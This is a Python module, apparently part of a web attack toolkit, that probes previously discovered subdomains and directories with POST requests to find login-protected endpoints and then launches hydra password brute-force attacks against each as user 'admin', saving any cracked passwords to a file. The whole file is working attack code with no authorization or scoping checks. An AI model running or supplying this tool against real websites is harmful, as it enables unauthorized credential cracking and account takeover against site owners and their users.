
"""
This module contains the functions that are used to crack the passwords of the
websites that require authentication
It can also be run as a standalone file for the domains listed in output_files/ dir
"""

import sys
import requests
import subprocess
from logger import logger
from multiprocessing import cpu_count
from concurrent.futures import ThreadPoolExecutor


def bruteForce(post_dirs, input_file):
	"""
	Uses the hydra tool to brute force the login page of the provided url
	Args:
	 input_file (str): path to the file containing the passwords
		post_dirs (list): list of urls that require authentication
	Returns:
		None
	"""

	username = "admin"
	password_file = input_file

	for url in post_dirs:
		hydra_command = f"hydra -l {username} -P {password_file} {url} http-post-form " \
		                f"'/:username=^USER^&password=^PASS^:F=incorrect'"
		output = subprocess.check_output(hydra_command, shell=True)
		if b"password found" in output:
			logger.info(f"Password found for {url}")
			with open("output_files/passwords.bat", "a") as f:
				f.write(f"{url} - {output.split(b':')[1].decode('utf-8')}")


def checkHydra():
	"""
	Checks if hydra is installed on the system
	Returns:
		True if hydra is installed, False otherwise
	"""

	try:
		subprocess.check_output(["which", "hydra"])
		return True
	except subprocess.CalledProcessError:
		logger.error("Hydra not found on system, cannot proceed with brute force")
		return False


def loadDomainsFromFile():
	"""
	Loads the valid subdomains and directories from their respective files
	Returns:
		valid_subdomains (list): list of valid subdomains
		valid_dirs (list): list of valid directories
	"""

	with open("output_files/valid_subdomains.bat", "r") as f:
		valid_subdomains = f.read().splitlines()

	with open("output_files/valid_dirs.bat", "r") as f:
		valid_dirs = f.read().splitlines()

	return valid_subdomains, valid_dirs


def checkPostDirs(valid_dirs, valid_subdomains):
	"""
	Checks which domains in the given lists support POST methods and which ones require authentication
	Args:
		valid_dirs (list): list of valid directories
		valid_subdomains (list): list of valid subdomains

	Returns:
		post_dirs (list): list of urls that support POST methods and require authentication
	"""

	post_dirs = []

	for domain in valid_subdomains:
		try:
			post_request = requests.post(domain)
		except requests.exceptions.ConnectionError:
			continue
		if post_request.status_code in [200, 201, 202, 203, 204, 205, 206]:
			print("Found POST directory that does not require authentication: " + domain + ", not adding to list")
		elif post_request.status_code in [401, 403]:
			post_dirs.append(domain)
			print("Found POST directory that requires authentication: " + domain)

	for directory in valid_dirs:
		try:
			post_request = requests.post(directory)
		except requests.exceptions.ConnectionError:
			continue
		if post_request.status_code in [200, 201, 202, 203, 204, 205, 206]:
			print("Found POST directory that does not require authentication: " + directory + ", not adding to list")
		elif post_request.status_code in [401, 403]:
			post_dirs.append(directory)
			print("Found POST directory that requires authentication: " + directory)

	return post_dirs


def postTask(valid_dirs, valid_subdomains):
	"""
	Checks which domains in the given lists support POST methods and which ones require authentication
	Args:
		valid_dirs (list): list of valid directories
		valid_subdomains (list): list of valid subdomains

	Returns:
		post_dirs (list): list of urls that support POST methods and require authentication
	"""

	post_dirs = checkPostDirs(valid_dirs, valid_subdomains)
	return post_dirs


def main():

	if len(sys.argv) != 2:
		sys.exit("Usage: python3 cracking.py <input_file>")
	else:
		input_file = sys.argv[1]

	if not checkHydra():
		print("Hydra not found on system, cannot proceed with brute force")
		sys.exit(1)

	valid_subdomains, valid_dirs = loadDomainsFromFile()

	# Divide the lists into chunks for the workers
	max_workers = cpu_count() - 2 if cpu_count() > 4 else 1
	divided_dirs = [valid_dirs[i::max_workers] for i in range(max_workers)]
	divided_subdomains = [valid_subdomains[i::max_workers] for i in range(max_workers)]

	# Create the workers
	workers = []
	with ThreadPoolExecutor(max_workers=max_workers) as executor:
		for i in range(max_workers):
			workers.append(executor.submit(postTask, divided_dirs[i], divided_subdomains[i]))

	# Merge the results from the workers
	post_dirs = []
	for worker in workers:
		post_dirs.extend(worker.result())
	if len(post_dirs) == 0:
		print("No POST directories found that require authentication")
	else:
		print(f"Found {len(post_dirs)} POST directories that require authentication")

	bruteForce(post_dirs, input_file)


if __name__ == "__main__":
	main()
